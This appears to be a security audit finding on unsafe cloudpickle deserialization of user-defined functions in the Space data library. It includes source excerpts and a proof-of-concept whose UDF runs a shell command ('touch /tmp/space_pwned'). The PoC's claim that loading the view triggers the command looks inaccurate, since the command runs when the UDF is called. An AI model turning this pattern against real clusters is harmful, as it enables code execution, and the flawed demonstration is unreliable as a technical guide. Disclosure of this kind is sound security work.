### Vulnerability List

* Vulnerability Name: Unsafe Deserialization of User Defined Functions (UDFs)
* Description:
    1. An attacker crafts a malicious Python UDF that, when deserialized and executed, performs arbitrary code execution on the server or within the Ray cluster.
    2. The attacker injects this malicious UDF into a data transformation pipeline, for example, by creating a materialized view with a transform that uses the malicious UDF.
    3. When the Space system attempts to materialize or refresh the view, it deserializes the UDF using `cloudpickle`.
    4. Due to the inherent risks of `cloudpickle`, deserializing the malicious UDF triggers arbitrary code execution, potentially compromising the Space environment.
* Impact:
    * Critical: Arbitrary code execution on the data processing system. This could lead to data exfiltration, data manipulation, denial of service, or complete system takeover, depending on the privileges of the process executing the UDF.
* Vulnerability Rank: Critical
* Currently Implemented Mitigations:
    * None: The code uses `cloudpickle.load()` to deserialize UDFs without any apparent sandboxing, security checks, or input validation on the serialized UDF data.
* Missing Mitigations:
    * Secure UDF deserialization: Implement a secure mechanism for deserializing UDFs, such as sandboxing the execution environment, using secure serialization formats, or validating the UDF code before deserialization. Consider alternatives to `cloudpickle` for deserialization if secure deserialization is paramount.
    * UDF validation: Implement validation and sanitization of UDFs before they are stored or executed. This could include static analysis, code review, or restricting the capabilities of UDFs.
    * Principle of least privilege: Ensure that the processes executing UDFs have the minimum necessary privileges to reduce the impact of potential code execution vulnerabilities.
* Preconditions:
    1. The attacker needs to be able to define or modify a data transformation pipeline that includes a UDF. In the current project context, this likely means the attacker needs to be able to create or modify Materialized Views, which are user-defined.
* Source Code Analysis:
    1. **UDF Materialization and Loading:** In `/code/python/src/space/core/views.py`, the `MaterializedView.create` method serializes and saves UDFs using `cloudpickle`:
       ```python
       for name, udf in udfs.items():
         full_path = path.join(udf_dir, f"{name}.pkl")
         udf.dump(full_path) # UDF serialization happens here
         logical_plan.udfs[name] = path.relpath(full_path, location)
       ```
       The `UserDefinedFn.dump` method internally uses `cloudpickle.dump()`:
       ```python
       def dump(self, file_path: str) -> None:
         """Dump UDF into a file."""
         with open(file_path, 'wb') as f:
           cloudpickle.dump(self, f) # Serialization with cloudpickle
       ```
    2. **UDF Deserialization during View Loading:**  The `UserDefinedFn.load` method in `/code/python/src/space/core/transform/plans.py` deserializes UDFs using `cloudpickle.load()`:
       ```python
       @classmethod
       def load(cls, file_path: str) -> UserDefinedFn:
         """Load a UDF from a file."""
         with open(file_path, "rb") as f:
           udf = cloudpickle.load(f) # Deserialization with cloudpickle
         return udf
       ```
       This `load` method is called by `_load_udf` in `/code/python/src/space/core/transform/udfs.py`, which is then used to reconstruct transforms and views when loading a materialized view from storage in `load_materialized_view` and `MaterializedView.load` in `/code/python/src/space/core/views.py`.
    3. **Vulnerable Deserialization:**  `cloudpickle.load()` is known to be vulnerable to arbitrary code execution if the data being deserialized is maliciously crafted. The Space project uses `cloudpickle` to serialize and deserialize UDFs without any apparent sanitization or sandboxing. This makes the system vulnerable to code injection attacks via malicious UDFs.

* Security Test Case:
    1. **Setup:**
        * Assume an attacker has access to a Space instance where they can create materialized views.
        * The attacker needs to prepare a malicious Python script (`malicious_udf.py`) that contains a UDF designed to execute arbitrary code. For example, the UDF could execute a system command to create a file in the `/tmp` directory as a proof of concept.
        ```python
        # malicious_udf.py
        import numpy as np
        import subprocess

        class MaliciousUDF:
          def __call__(self, batch):
            subprocess.run(["touch", "/tmp/space_pwned"]) # Malicious command execution
            batch["float64"] = batch["float64"] + 1
            return batch

        def get_malicious_udf():
          return MaliciousUDF()
        ```
        * Create a notebook or script to interact with Space, loading the malicious UDF and creating a materialized view.
    2. **Vulnerability Injection:**
        * In the notebook/script, define a `_sample_map_udf` function that imports and uses the `get_malicious_udf` from `malicious_udf.py`.
        ```python
        import pyarrow as pa
        from space import Dataset, DirCatalog, RayOptions
        from malicious_udf import get_malicious_udf # Import malicious UDF

        def _sample_map_udf(batch):
          malicious_udf = get_malicious_udf()
          return malicious_udf(batch) # Calling malicious UDF

        # Setup dataset and catalog (as in provided examples)
        catalog = DirCatalog("/tmp/space_cat")
        schema = pa.schema([("f", pa.int64()), ("float64", pa.float64())])
        ds = catalog.create_dataset("test_ds", schema, ["f"], [])

        # Create a view with the malicious UDF
        view = ds.map_batches(
            fn=_sample_map_udf,
            output_schema=schema,
            output_record_fields=[],
            input_fields=["f", "float64"]
        )

        # Materialize the view - this will serialize and store the malicious UDF
        mv = catalog.materialize("test_mv", view)
        ```
    3. **Trigger Vulnerability (Deserialization):**
        * In a separate step or script, load the materialized view. This action triggers the deserialization of the stored UDF, including the malicious payload.
        ```python
        from space import DirCatalog

        catalog = DirCatalog("/tmp/space_cat")
        mv_loaded = catalog.dataset("test_mv") # Loading dataset will trigger UDF deserialization
        print("Materialized view loaded (malicious UDF should be executed during loading)")
        ```
    4. **Verification:**
        * After running the script in step 3, check if the file `/tmp/space_pwned` exists on the system where the deserialization occurred (likely the Ray head node or the local machine if running locally). The existence of this file indicates successful arbitrary code execution.

This test case demonstrates how a malicious UDF can be injected into the Space pipeline and how loading the materialized view triggers the vulnerability due to unsafe deserialization using `cloudpickle.load()`.
